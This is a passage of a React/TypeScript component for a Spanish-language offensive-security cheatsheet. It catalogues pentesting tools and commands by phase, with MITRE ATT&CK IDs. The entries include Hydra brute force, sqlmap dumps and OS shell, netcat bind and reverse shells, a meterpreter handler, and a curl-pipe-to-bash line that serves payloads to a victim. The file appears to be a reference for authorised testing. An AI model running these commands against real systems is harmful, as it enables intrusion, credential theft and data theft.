/**
 * Comandos — Arsenal de comandos y técnicas ofensivas
 * Cheatsheet personal: comandos reales con ejemplos, organizado por herramienta y fase.
 * Se vincula con la sección de Técnicas (MITRE ATT&CK).
 */

import { useState, useMemo, useEffect, useRef } from 'react'
import { Search, Copy, Check, Terminal, ChevronRight, ChevronDown, ExternalLink, Plus, Pencil, Trash2, X } from 'lucide-react'
import { Link } from '@tanstack/react-router'
import { toast } from 'sonner'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Textarea } from '@/components/ui/textarea'
import { cn } from '@/lib/utils'
import { apiFetch } from '@/lib/api'
import { useAuthStore } from '@/stores/auth-store'

// ─── Tipos ────────────────────────────────────────────────────────────────────
type Phase = 'recon' | 'scanning' | 'exploitation' | 'post_exploitation' | 'general'

interface Comando {
  id: string
  tool: string
  phase: Phase
  category: string
  title: string
  command: string
  description: string
  tags: string[]
  notes?: string
  mitreId?: string
  isCustom?: boolean   // true for commands added via DB
  isModified?: boolean // true for built-in commands with override in DB
}

// ─── Fases ────────────────────────────────────────────────────────────────────
const PHASE_LABELS: Record<Phase, string> = {
  recon:            'Reconocimiento',
  scanning:         'Escaneo',
  exploitation:     'Explotación',
  post_exploitation:'Post-Explotación',
  general:          'General',
}

const PHASE_COLORS: Record<Phase, string> = {
  recon:            'bg-blue-500/15 text-blue-400 border-blue-500/30',
  scanning:         'bg-cyan-500/15 text-cyan-400 border-cyan-500/30',
  exploitation:     'bg-red-500/15 text-red-400 border-red-500/30',
  post_exploitation:'bg-orange-500/15 text-orange-400 border-orange-500/30',
  general:          'bg-zinc-500/15 text-zinc-400 border-zinc-500/30',
}

// ─── Arsenal categories ───────────────────────────────────────────────────────
const ARSENAL_CATS = [
  { id: 'cat1',  label: 'Reconocimiento / OSINT / superficie de ataque' },
  { id: 'cat2',  label: 'Escaneo de red y enumeración de servicios' },
  { id: 'cat3',  label: 'Seguridad web / Web Pentesting / DAST' },
  { id: 'cat4',  label: 'Fuzzing, discovery de rutas y parámetros' },
  { id: 'cat5',  label: 'Application Security / revisión de código / DevSecOps' },
  { id: 'cat6',  label: 'API Security' },
  { id: 'cat7',  label: 'Fuerza bruta / auditoría de contraseñas' },
  { id: 'cat8',  label: 'Active Directory / Windows / red interna' },
  { id: 'cat9',  label: 'Explotación controlada y post-explotación' },
  { id: 'cat10', label: 'Vulnerability assessment general' },
  { id: 'cat11', label: 'Sniffing, MITM y análisis de tráfico' },
  { id: 'cat12', label: 'Wireless / WiFi / Bluetooth / RF' },
  { id: 'cat13', label: 'Mobile Security' },
  { id: 'cat14', label: 'Cloud, contenedores e infraestructura como código' },
  { id: 'cat15', label: 'Reversing, malware básico y binarios' },
  { id: 'ssh',   label: 'SSH' },
  { id: 'util',  label: 'Utilidades generales' },
] as const

type ArsenalCatId = typeof ARSENAL_CATS[number]['id']

// ─── Herramientas con metadata ────────────────────────────────────────────────
interface ToolMeta {
  label: string
  description: string
  arsenalCat: ArsenalCatId
  kali: 'yes' | 'partial' | 'no'
  mitreIds?: string[]
}

const TOOL_META: Record<string, ToolMeta> = {
  // cat1 — Reconocimiento / OSINT
  amass:        { label: 'Amass',        description: 'DNS enumeration y OSINT de subdominios',              arsenalCat: 'cat1',  kali: 'yes',     mitreIds: ['T1590'] },
  subfinder:    { label: 'Subfinder',    description: 'Descubrimiento pasivo de subdominios vía APIs',        arsenalCat: 'cat1',  kali: 'yes',     mitreIds: ['T1590'] },
  theHarvester: { label: 'theHarvester', description: 'OSINT de emails, subdominios, hosts e IPs',           arsenalCat: 'cat1',  kali: 'yes',     mitreIds: ['T1589', 'T1590'] },
  // cat2 — Escaneo de red
  nmap:         { label: 'Nmap',         description: 'Network mapper — port scanning y fingerprinting',      arsenalCat: 'cat2',  kali: 'yes',     mitreIds: ['T1595', 'T1592'] },
  masscan:      { label: 'Masscan',      description: 'Escaneo de puertos masivo a alta velocidad',           arsenalCat: 'cat2',  kali: 'yes',     mitreIds: ['T1595'] },
  rustscan:     { label: 'RustScan',     description: 'Port scanner ultra-rápido, pasa resultados a nmap',    arsenalCat: 'cat2',  kali: 'partial', mitreIds: ['T1595'] },
  // cat3 — Seguridad web
  burpsuite:    { label: 'Burp Suite',   description: 'Proxy + web app testing toolkit',                     arsenalCat: 'cat3',  kali: 'partial', mitreIds: ['T1190'] },
  sqlmap:       { label: 'SQLMap',       description: 'Detección y explotación de SQL Injection',             arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1190'] },
  nikto:        { label: 'Nikto',        description: 'Web server scanner — misconfigs y vulns conocidas',    arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1190'] },
  whatweb:      { label: 'WhatWeb',      description: 'Fingerprinting de tecnologías web',                    arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1592'] },
  // cat4 — Fuzzing
  ffuf:         { label: 'FFuf',         description: 'Web fuzzing rápido — directorios, parámetros, vhosts', arsenalCat: 'cat4',  kali: 'yes',     mitreIds: ['T1190'] },
  gobuster:     { label: 'Gobuster',     description: 'Directory/DNS/vhost brute-force',                      arsenalCat: 'cat4',  kali: 'yes',     mitreIds: ['T1190'] },
  feroxbuster:  { label: 'Feroxbuster',  description: 'Directory fuzzer recursivo y rápido en Rust',          arsenalCat: 'cat4',  kali: 'partial', mitreIds: ['T1190'] },
  // cat5 — AppSec / DevSecOps
  semgrep:      { label: 'Semgrep',      description: 'SAST — análisis estático de código multi-lenguaje',    arsenalCat: 'cat5',  kali: 'no',      mitreIds: [] },
  trufflehog:   { label: 'TruffleHog',  description: 'Detecta secrets y credenciales en git repos',          arsenalCat: 'cat5',  kali: 'no',      mitreIds: ['T1552'] },
  gitleaks:     { label: 'Gitleaks',    description: 'Escanea repos git por secrets filtrados',               arsenalCat: 'cat5',  kali: 'no',      mitreIds: ['T1552'] },
  // cat6 — API Security
  curl:         { label: 'cURL',         description: 'HTTP client — recon, testing, API calls',              arsenalCat: 'cat6',  kali: 'yes',     mitreIds: ['T1592'] },
  httpie:       { label: 'HTTPie',       description: 'HTTP client amigable para testing de APIs',             arsenalCat: 'cat6',  kali: 'yes',     mitreIds: [] },
  // cat7 — Fuerza bruta
  hydra:        { label: 'Hydra',        description: 'Brute-force de autenticación remota',                  arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1133', 'T1110'] },
  hashcat:      { label: 'Hashcat',      description: 'GPU-accelerated password cracking',                    arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1110'] },
  john:         { label: 'John the Ripper', description: 'Password cracking clásico y versátil',              arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1110'] },
  // cat8 — AD / Windows
  impacket:     { label: 'Impacket',     description: 'Suite Python para protocolos Windows/AD',              arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1003', 'T1021'] },
  mimikatz:     { label: 'Mimikatz',     description: 'Extracción de credenciales Windows',                   arsenalCat: 'cat8',  kali: 'no',      mitreIds: ['T1003', 'T1134'] },
  crackmapexec: { label: 'CrackMapExec', description: 'Swiss army knife para pentesting de redes Windows',    arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1021', 'T1110'] },
  bloodhound:   { label: 'BloodHound',   description: 'Mapeo de rutas de ataque en Active Directory',         arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1069', 'T1087'] },
  evilwinrm:    { label: 'Evil-WinRM',   description: 'Shell interactiva via WinRM para post-explotación',    arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1021'] },
  // cat9 — Explotación
  metasploit:   { label: 'Metasploit',   description: 'Framework de explotación y post-explotación',          arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1190', 'T1203'] },
  msfvenom:     { label: 'MSFVenom',     description: 'Generador de payloads/shellcode',                      arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1566'] },
  shells:       { label: 'Reverse Shells', description: 'One-liners para reverse/bind shells',                arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
  netcat:       { label: 'Netcat',       description: 'Swiss army knife de redes — shells, transfers',        arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
  python:       { label: 'Python',       description: 'Scripts, servidores rápidos, shells',                  arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
  linpeas:      { label: 'LinPEAS',      description: 'Linux Privilege Escalation Awesome Script',            arsenalCat: 'cat9',  kali: 'no',      mitreIds: ['T1068', 'T1548'] },
  winpeas:      { label: 'WinPEAS',      description: 'Windows Privilege Escalation Awesome Script',          arsenalCat: 'cat9',  kali: 'no',      mitreIds: ['T1068', 'T1548'] },
  // cat10 — Vuln assessment
  nuclei:       { label: 'Nuclei',       description: 'Vulnerability scanner basado en templates',            arsenalCat: 'cat10', kali: 'yes',     mitreIds: ['T1190'] },
  // cat11 — Sniffing / MITM
  tcpdump:      { label: 'tcpdump',      description: 'Captura y análisis de tráfico de red',                 arsenalCat: 'cat11', kali: 'yes',     mitreIds: [] },
  responder:    { label: 'Responder',    description: 'MITM — captura hashes NetNTLM via LLMNR/NBT-NS',       arsenalCat: 'cat11', kali: 'yes',     mitreIds: ['T1557'] },
  bettercap:    { label: 'Bettercap',    description: 'Framework MITM modular — ARP, DNS, HTTP, BLE',         arsenalCat: 'cat11', kali: 'yes',     mitreIds: ['T1557'] },
  // cat12 — Wireless
  aircrackng:   { label: 'Aircrack-ng',  description: 'Suite completa para auditoría de redes WiFi',          arsenalCat: 'cat12', kali: 'yes',     mitreIds: [] },
  wifite:       { label: 'Wifite',       description: 'Ataque automatizado a redes WiFi WPA/WEP',             arsenalCat: 'cat12', kali: 'yes',     mitreIds: [] },
  // cat13 — Mobile
  apktool:      { label: 'APKTool',      description: 'Decompila y recompila APKs Android',                   arsenalCat: 'cat13', kali: 'yes',     mitreIds: [] },
  jadx:         { label: 'JADX',         description: 'Decompilador DEX/APK a código Java legible',           arsenalCat: 'cat13', kali: 'no',      mitreIds: [] },
  frida:        { label: 'Frida',        description: 'Dynamic instrumentation — hooking y análisis runtime',  arsenalCat: 'cat13', kali: 'no',      mitreIds: [] },
  // cat14 — Cloud / contenedores
  awscli:       { label: 'AWS CLI',      description: 'CLI oficial para auditoría y pentesting de AWS',        arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
  trivy:        { label: 'Trivy',        description: 'Scanner de vulns en imágenes Docker, repos y configs',  arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
  kubectl:      { label: 'kubectl',      description: 'CLI de Kubernetes — enumeración y post-explotación',    arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
  // cat15 — Reversing
  ghidra:       { label: 'Ghidra',       description: 'Reverse engineering framework de la NSA',              arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
  radare2:      { label: 'Radare2',      description: 'Framework de reversing y análisis de binarios',         arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
  gdb:          { label: 'GDB',          description: 'GNU debugger — debugging y exploit development',        arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
  binwalk:      { label: 'Binwalk',      description: 'Extracción y análisis de firmware',                    arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
  // ssh
  ssh:          { label: 'SSH',          description: 'Tunneling, port forwarding, SOCKS, admin remoto',       arsenalCat: 'ssh',   kali: 'yes',     mitreIds: ['T1021'] },
  // util
  wordlists:    { label: 'Wordlists',    description: 'Gestión y uso de diccionarios',                        arsenalCat: 'util',  kali: 'yes',     mitreIds: [] },
  wget:         { label: 'wget',         description: 'Descarga de archivos, recon de sitios',                 arsenalCat: 'util',  kali: 'yes',     mitreIds: [] },
  // OSINT extendido
  'google-dorks':     { label: 'Google Dorks',    description: 'Dorks para Google, Bing y Shodan — recon avanzado',          arsenalCat: 'cat1',  kali: 'no',      mitreIds: ['T1593'] },
  osrframework:       { label: 'OSRFramework',    description: 'OSINT de usuarios, emails, teléfonos y dominios',            arsenalCat: 'cat1',  kali: 'no',      mitreIds: ['T1589'] },
  // Wordlist gen
  crunch:             { label: 'Crunch',          description: 'Generador de wordlists con patrones y clases de caracteres', arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1110'] },
  // Web manual
  'manual-sqli':      { label: 'Manual SQLi',     description: 'Payloads de inyección SQL sin sqlmap — quick reference',    arsenalCat: 'cat3',  kali: 'no',      mitreIds: ['T1190'] },
  // Shell escape
  'restricted-shell': { label: 'Shell Escape',    description: 'Escape de shells restringidas: rbash, lshell, vi, PATH',    arsenalCat: 'cat9',  kali: 'no',      mitreIds: ['T1059'] },
}

// ─── Base de comandos ─────────────────────────────────────────────────────────
const COMANDOS: Comando[] = [
  // ── NMAP ──────────────────────────────────────────────────────────────────
  {
    id: 'nmap-syn',
    tool: 'nmap', phase: 'scanning', category: 'Port Scanning',
    title: 'SYN Scan (stealth)',
    command: 'nmap -sS -p- --min-rate 5000 -T4 <target>',
    description: 'Half-open SYN scan. No completa el handshake TCP — más silencioso que un connect scan. Escanea todos los puertos a alta velocidad.',
    tags: ['port-scan', 'stealth', 'tcp'],
    notes: 'Requiere root/sudo. Es el tipo de escaneo más común en pentesting.',
    mitreId: 'T1595',
  },
  {
    id: 'nmap-version',
    tool: 'nmap', phase: 'scanning', category: 'Service Detection',
    title: 'Version + Default Scripts',
    command: 'nmap -sV -sC -p <ports> -oN scan.txt <target>',
    description: 'Detecta versiones de servicios (-sV) y ejecuta scripts NSE por defecto (-sC). Guarda resultado en archivo. Correr sobre puertos ya descubiertos.',
    tags: ['version-detection', 'nse', 'fingerprinting'],
    mitreId: 'T1592',
  },
  {
    id: 'nmap-aggressive',
    tool: 'nmap', phase: 'scanning', category: 'Service Detection',
    title: 'Aggressive Scan',
    command: 'nmap -A -T4 -p <ports> <target>',
    description: 'Combinación de OS detection, version detection, script scanning y traceroute. Ruidoso pero informativo. Usar sobre puertos específicos.',
    tags: ['os-detection', 'version-detection', 'nse', 'aggressive'],
  },
  {
    id: 'nmap-udp',
    tool: 'nmap', phase: 'scanning', category: 'Port Scanning',
    title: 'UDP Top Ports',
    command: 'nmap -sU --top-ports 200 --min-rate 1000 <target>',
    description: 'Escaneo UDP de los 200 puertos más comunes. UDP es lento — limitar a top ports primero. Útil para encontrar DNS, SNMP, NFS, TFTP, etc.',
    tags: ['udp', 'port-scan'],
  },
  {
    id: 'nmap-vuln',
    tool: 'nmap', phase: 'scanning', category: 'Vulnerability Scanning',
    title: 'Vuln Script',
    command: 'nmap --script vuln -p <ports> <target>',
    description: 'Ejecuta scripts NSE de la categoría "vuln". Detecta CVEs conocidos, misconfigurations y vulnerabilidades comunes.',
    tags: ['vuln-scan', 'nse', 'cve'],
  },
  {
    id: 'nmap-discovery',
    tool: 'nmap', phase: 'recon', category: 'Host Discovery',
    title: 'Host Discovery (ping scan)',
    command: 'nmap -sn 192.168.1.0/24',
    description: 'Descubre hosts activos en una red sin escanear puertos. Envía ICMP, SYN 443, ACK 80 y ICMP timestamp.',
    tags: ['host-discovery', 'network', 'ping-scan'],
    mitreId: 'T1595',
  },
  {
    id: 'nmap-scripts-smb',
    tool: 'nmap', phase: 'scanning', category: 'Scripts NSE',
    title: 'SMB Enumeration',
    command: 'nmap --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 -p 445 <target>',
    description: 'Enumera shares y usuarios SMB, y verifica si es vulnerable a EternalBlue (MS17-010 / WannaCry).',
    tags: ['smb', 'windows', 'nse', 'eternal-blue'],
  },
  {
    id: 'nmap-output-all',
    tool: 'nmap', phase: 'scanning', category: 'Output',
    title: 'Output en todos los formatos',
    command: 'nmap -sV -sC -p- -oA fullscan <target>',
    description: 'Guarda resultados en tres formatos: .nmap (texto), .xml y .gnmap. Útil para importar en herramientas como Metasploit o Faraday.',
    tags: ['output', 'report'],
  },

  // ── PYTHON ────────────────────────────────────────────────────────────────
  {
    id: 'python-http',
    tool: 'python', phase: 'general', category: 'Servidores',
    title: 'HTTP Server simple',
    command: 'python3 -m http.server 8080',
    description: 'Levanta un servidor HTTP en el directorio actual en el puerto 8080. Ideal para transferir archivos a la víctima o servir payloads.',
    tags: ['server', 'file-transfer'],
    notes: 'Acceder desde el target: curl http://<tu-ip>:8080/archivo.sh | bash',
    mitreId: 'T1059',
  },
  {
    id: 'python-http-ip',
    tool: 'python', phase: 'general', category: 'Servidores',
    title: 'HTTP Server en IP específica',
    command: 'python3 -m http.server 8080 --bind 0.0.0.0',
    description: 'Bind explícito en todas las interfaces. Útil cuando hay múltiples interfaces de red.',
    tags: ['server', 'file-transfer'],
  },
  {
    id: 'python-pty',
    tool: 'python', phase: 'post_exploitation', category: 'Shell Upgrade',
    title: 'Spawn PTY (shell interactiva)',
    command: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
    description: 'Convierte una shell básica en una pseudo-terminal interactiva. Permite usar comandos que requieren TTY como sudo, ssh, vi.',
    tags: ['shell-upgrade', 'pty', 'interactive'],
    notes: 'Después de esto: Ctrl+Z → stty raw -echo; fg → reset',
    mitreId: 'T1059',
  },
  {
    id: 'python-ftp',
    tool: 'python', phase: 'general', category: 'Servidores',
    title: 'FTP Server (pyftpdlib)',
    command: 'python3 -m pyftpdlib -p 21 -u user -P pass -w',
    description: 'Servidor FTP con autenticación. Requiere pyftpdlib instalado. Útil cuando el target solo puede conectar por FTP.',
    tags: ['server', 'file-transfer', 'ftp'],
    notes: 'Instalar: pip3 install pyftpdlib',
  },
  {
    id: 'python-hashcrack',
    tool: 'python', phase: 'exploitation', category: 'Scripts útiles',
    title: 'Hash identificador',
    command: "python3 -c \"import hashlib; print(hashlib.md5(b'password').hexdigest())\"",
    description: 'One-liner para generar hashes rápido. Cambiar md5 por sha1, sha256, sha512 según necesidad.',
    tags: ['hash', 'encoding'],
  },
  {
    id: 'python-b64',
    tool: 'python', phase: 'general', category: 'Encoding',
    title: 'Base64 encode/decode',
    command: "python3 -c \"import base64; print(base64.b64encode(b'string').decode())\"",
    description: 'Codificar/decodificar base64 rápido. Para decode: base64.b64decode(b\'encoded\').decode()',
    tags: ['encoding', 'base64'],
  },

  // ── NETCAT ────────────────────────────────────────────────────────────────
  {
    id: 'nc-listen',
    tool: 'netcat', phase: 'exploitation', category: 'Reverse Shell',
    title: 'Listener para reverse shell',
    command: 'nc -lvnp 4444',
    description: 'Abre un listener en el puerto 4444. -l: listen, -v: verbose, -n: no DNS, -p: port. Espera conexión entrante (reverse shell).',
    tags: ['listener', 'reverse-shell'],
    mitreId: 'T1059',
  },
  {
    id: 'nc-connect',
    tool: 'netcat', phase: 'exploitation', category: 'Conexión',
    title: 'Conectar a puerto',
    command: 'nc -v <target> <port>',
    description: 'Conexión TCP básica a un host:puerto. Útil para banner grabbing manual o probar si un puerto está abierto.',
    tags: ['connection', 'banner-grab'],
  },
  {
    id: 'nc-file-transfer',
    tool: 'netcat', phase: 'post_exploitation', category: 'File Transfer',
    title: 'Transferencia de archivos',
    command: '# Receptor (target):\nnc -lvnp 4444 > archivo_recibido.txt\n\n# Emisor (tú):\nnc <target-ip> 4444 < archivo_a_enviar.txt',
    description: 'Transferencia de archivos sin cifrado via netcat. El receptor escucha, el emisor redirige el archivo al socket.',
    tags: ['file-transfer', 'exfiltration'],
  },
  {
    id: 'nc-port-scan',
    tool: 'netcat', phase: 'scanning', category: 'Port Scanning',
    title: 'Port scan rápido',
    command: 'nc -zv <target> 1-1000 2>&1 | grep succeeded',
    description: 'Escaneo de puertos con netcat. -z: zero-I/O mode, solo verifica si el puerto está abierto. Lento comparado con nmap.',
    tags: ['port-scan'],
  },
  {
    id: 'nc-bind-shell',
    tool: 'netcat', phase: 'exploitation', category: 'Bind Shell',
    title: 'Bind shell (Linux)',
    command: 'nc -lvnp 4444 -e /bin/bash',
    description: 'Abre una bind shell: el target escucha y ejecuta bash para quien se conecte. -e: ejecuta programa al conectar.',
    tags: ['bind-shell', 'linux'],
    notes: 'Conectar desde tu máquina: nc <target-ip> 4444',
  },

  // ── HYDRA ─────────────────────────────────────────────────────────────────
  {
    id: 'hydra-ssh',
    tool: 'hydra', phase: 'exploitation', category: 'Brute Force',
    title: 'SSH Brute Force',
    command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4',
    description: 'Brute force SSH con usuario fijo y wordlist. -t 4: 4 threads. Limitar threads en SSH para evitar lockout.',
    tags: ['ssh', 'brute-force', 'credential-attack'],
    mitreId: 'T1110',
  },
  {
    id: 'hydra-http-form',
    tool: 'hydra', phase: 'exploitation', category: 'Brute Force',
    title: 'HTTP Form Login',
    command: "hydra -l admin -P rockyou.txt <target> http-post-form \"/login:username=^USER^&password=^PASS^:Invalid credentials\" -V",
    description: 'Brute force de formularios HTTP POST. Ajustar la URL, campos y mensaje de error según el target.',
    tags: ['http', 'web', 'brute-force', 'form'],
    mitreId: 'T1110',
  },
  {
    id: 'hydra-ftp',
    tool: 'hydra', phase: 'exploitation', category: 'Brute Force',
    title: 'FTP Brute Force',
    command: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<target>',
    description: 'Brute force FTP con lista de usuarios y contraseñas. -L: lista de usuarios, -P: lista de contraseñas.',
    tags: ['ftp', 'brute-force'],
  },
  {
    id: 'hydra-smb',
    tool: 'hydra', phase: 'exploitation', category: 'Brute Force',
    title: 'SMB Brute Force',
    command: 'hydra -l administrator -P rockyou.txt smb://<target>',
    description: 'Brute force de autenticación SMB/Windows.',
    tags: ['smb', 'windows', 'brute-force'],
  },
  {
    id: 'hydra-userfile',
    tool: 'hydra', phase: 'exploitation', category: 'Brute Force',
    title: 'User + Pass combo (ambas listas)',
    command: 'hydra -L users.txt -P passwords.txt <target> ssh -t 4 -V',
    description: 'Usar -L (mayúscula) para lista de usuarios y -P para lista de contraseñas. -V: mostrar cada intento.',
    tags: ['ssh', 'brute-force', 'combo'],
  },

  // ── SQLMAP ────────────────────────────────────────────────────────────────
  {
    id: 'sqlmap-basic',
    tool: 'sqlmap', phase: 'exploitation', category: 'SQL Injection',
    title: 'Detección básica + enumerar DBs',
    command: 'sqlmap -u "http://target/page?id=1" --dbs --batch',
    description: 'Detecta si el parámetro id es vulnerable a SQLi y enumera las bases de datos disponibles. --batch: no preguntar confirmaciones.',
    tags: ['sqli', 'web', 'enum'],
    mitreId: 'T1190',
  },
  {
    id: 'sqlmap-dump',
    tool: 'sqlmap', phase: 'exploitation', category: 'SQL Injection',
    title: 'Dump de tabla',
    command: 'sqlmap -u "http://target/page?id=1" -D database_name -T table_name --dump --batch',
    description: 'Vuelca el contenido de una tabla específica. Primero enumerar DBs (--dbs), luego tablas (-D db --tables), luego dump.',
    tags: ['sqli', 'dump', 'data-exfiltration'],
  },
  {
    id: 'sqlmap-post',
    tool: 'sqlmap', phase: 'exploitation', category: 'SQL Injection',
    title: 'POST request (con Burp)',
    command: 'sqlmap -r request.txt --dbs --batch --level 2 --risk 2',
    description: 'Testear desde un archivo de request capturado con Burp Suite. -r: archivo con el HTTP request completo.',
    tags: ['sqli', 'post', 'burp'],
    notes: 'Guardar request desde Burp: click derecho → Save item',
  },
  {
    id: 'sqlmap-cookie',
    tool: 'sqlmap', phase: 'exploitation', category: 'SQL Injection',
    title: 'SQLi en cookie',
    command: 'sqlmap -u "http://target/" --cookie="session=value; user=^1^" -p user --dbs',
    description: 'Testear inyección en parámetros de cookie. -p: especificar el parámetro a testear.',
    tags: ['sqli', 'cookie', 'session'],
  },
  {
    id: 'sqlmap-shell',
    tool: 'sqlmap', phase: 'exploitation', category: 'SQL Injection',
    title: 'OS Shell (si DBA)',
    command: 'sqlmap -u "http://target/page?id=1" --os-shell --batch',
    description: 'Si el usuario DB tiene privilegios de DBA (ej: root en MySQL), intentar obtener RCE via SQLi.',
    tags: ['sqli', 'rce', 'os-shell'],
  },

  // ── FFUF ──────────────────────────────────────────────────────────────────
  {
    id: 'ffuf-dir',
    tool: 'ffuf', phase: 'recon', category: 'Directory Fuzzing',
    title: 'Directory/file fuzzing',
    command: 'ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403',
    description: 'Fuerza bruta de directorios y archivos. -mc: mostrar solo códigos de respuesta específicos. FUZZ es el placeholder.',
    tags: ['web', 'directory', 'fuzzing'],
    mitreId: 'T1190',
  },
  {
    id: 'ffuf-extensions',
    tool: 'ffuf', phase: 'recon', category: 'Directory Fuzzing',
    title: 'Fuzzing con extensiones',
    command: 'ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak,.old -mc 200,301,302',
    description: 'Agrega extensiones automáticamente a cada palabra del wordlist. Útil para encontrar archivos de backup, fuentes PHP, etc.',
    tags: ['web', 'fuzzing', 'extensions', 'backup'],
  },
  {
    id: 'ffuf-vhost',
    tool: 'ffuf', phase: 'recon', category: 'Vhost Fuzzing',
    title: 'Virtual Host fuzzing',
    command: 'ffuf -u http://target -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200 -fs 0',
    description: 'Descubre virtual hosts en un servidor. Modificar el header Host en lugar de la URL. -fs: filtrar por tamaño de respuesta.',
    tags: ['vhost', 'subdomain', 'fuzzing'],
  },
  {
    id: 'ffuf-param',
    tool: 'ffuf', phase: 'recon', category: 'Parameter Fuzzing',
    title: 'Parameter fuzzing (GET)',
    command: 'ffuf -u "http://target/page?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200',
    description: 'Descubre parámetros GET ocultos. Requiere SecLists instalado.',
    tags: ['parameter', 'fuzzing', 'web'],
    notes: 'SecLists: apt install seclists o clonar https://github.com/danielmiessler/SecLists',
  },
  {
    id: 'ffuf-filter',
    tool: 'ffuf', phase: 'recon', category: 'Filtros útiles',
    title: 'Filtros de respuesta',
    command: 'ffuf -u http://target/FUZZ -w wordlist.txt -fc 404 -fs 1234 -fw 10 -fl 20',
    description: 'Filtros: -fc (filter code), -fs (filter size), -fw (filter words), -fl (filter lines). Útil para eliminar false positives.',
    tags: ['fuzzing', 'filters'],
  },

  // ── GOBUSTER ──────────────────────────────────────────────────────────────
  {
    id: 'gobuster-dir',
    tool: 'gobuster', phase: 'recon', category: 'Directory Fuzzing',
    title: 'Directory brute-force',
    command: 'gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50',
    description: 'Fuerza bruta de directorios con extensiones. -t: threads. Más legible que ffuf para uso básico.',
    tags: ['web', 'directory', 'brute-force'],
    mitreId: 'T1190',
  },
  {
    id: 'gobuster-dns',
    tool: 'gobuster', phase: 'recon', category: 'DNS Enumeration',
    title: 'DNS subdomain enumeration',
    command: 'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50',
    description: 'Enumera subdominios via DNS. Requiere resolución DNS. Más lento que amass pero simple.',
    tags: ['dns', 'subdomain', 'recon'],
    mitreId: 'T1590',
  },

  // ── BURP SUITE ────────────────────────────────────────────────────────────
  {
    id: 'burp-proxy',
    tool: 'burpsuite', phase: 'exploitation', category: 'Proxy',
    title: 'Configurar proxy del browser',
    command: '# Firefox: Preferences → Network → Manual proxy\n# HTTP Proxy: 127.0.0.1  Port: 8080\n# También: instalar extension FoxyProxy',
    description: 'Configurar el browser para pasar tráfico por Burp. El proxy escucha en 127.0.0.1:8080 por defecto.',
    tags: ['proxy', 'setup'],
    mitreId: 'T1190',
  },
  {
    id: 'burp-repeater',
    tool: 'burpsuite', phase: 'exploitation', category: 'Repeater',
    title: 'Repeater — replay de requests',
    command: '# 1. Capturar request en Proxy → HTTP History\n# 2. Click derecho → Send to Repeater (Ctrl+R)\n# 3. Modificar parámetros y enviar con Ctrl+Space\n# 4. Comparar respuestas',
    description: 'Repeater permite enviar y modificar requests manualmente. Esencial para testing manual de SQLi, XSS, IDOR, etc.',
    tags: ['repeater', 'manual-testing'],
  },
  {
    id: 'burp-intruder',
    tool: 'burpsuite', phase: 'exploitation', category: 'Intruder',
    title: 'Intruder — fuzzing/brute force',
    command: '# 1. Send to Intruder (Ctrl+I)\n# 2. Positions tab: seleccionar §param§\n# 3. Payloads tab: cargar wordlist\n# 4. Attack Type: Sniper (1 param) o Cluster Bomb (múltiples)',
    description: 'Intruder para brute force de formularios, fuzzing de parámetros y testing de lógica. En Community es throttled (lento).',
    tags: ['intruder', 'brute-force', 'fuzzing'],
    notes: 'Para brute force rápido usar Hydra o ffuf. Intruder en Community = muy lento.',
  },

  // ── METASPLOIT ────────────────────────────────────────────────────────────
  {
    id: 'msf-start',
    tool: 'metasploit', phase: 'exploitation', category: 'Básicos',
    title: 'Iniciar y buscar exploits',
    command: 'msfconsole\nsearch type:exploit platform:windows ms17-010\nuse exploit/windows/smb/ms17_010_eternalblue\ninfo',
    description: 'Iniciar Metasploit, buscar un exploit y obtener info. search admite filtros: type, platform, CVE, nombre.',
    tags: ['metasploit', 'exploit', 'search'],
    mitreId: 'T1190',
  },
  {
    id: 'msf-handler',
    tool: 'metasploit', phase: 'exploitation', category: 'Handler',
    title: 'Multi/Handler (recibir reverse shell)',
    command: 'use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST <tu-ip>\nset LPORT 4444\nrun',
    description: 'Handler genérico para recibir conexiones de payloads MSFVenom. Configurar el mismo payload/LHOST/LPORT que el payload generado.',
    tags: ['handler', 'reverse-shell', 'meterpreter'],
  },
  {
    id: 'msf-meterpreter',
    tool: 'metasploit', phase: 'post_exploitation', category: 'Meterpreter',
    title: 'Comandos Meterpreter útiles',
